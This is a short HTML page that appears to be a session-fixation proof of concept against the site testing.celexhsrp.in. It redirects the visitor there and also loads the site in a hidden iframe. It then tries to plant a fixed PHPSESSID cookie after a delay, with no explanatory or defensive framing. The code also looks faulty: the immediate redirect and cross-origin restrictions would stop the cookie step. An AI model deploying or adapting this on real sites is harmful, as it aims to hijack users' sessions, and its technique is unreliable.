<!DOCTYPE html>
<html>
<head>
    <title>Set Cookie</title>
</head>
<body>
    <script>
        // Redirect to the target site
        window.location.href = "https://testing.celexhsrp.in";
        
        // Function to set the cookie in the background
        function setCookieInBackground() {
            // Create a hidden iframe
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = "https://testing.celexhsrp.in";
            document.body.appendChild(iframe);

            // Set the cookie after the iframe loads
            iframe.onload = function() {
                // Set a delay to ensure the iframe has fully loaded
                setTimeout(function() {
                    iframe.contentWindow.document.cookie = "PHPSESSID=ISOAH1234; domain=testing.celexhsrp.in; path=/; SameSite=None; Secure";
                    console.log("Cookie has been set in the background.");
                }, 5000); // Wait for 5 seconds
            };
        }

        // Execute the function after the page has loaded
        window.onload = setCookieInBackground;
    </script>
    <p>If you are not redirected, click <a href="https://testing.celexhsrp.in">here</a>.</p>
</body>
</html>
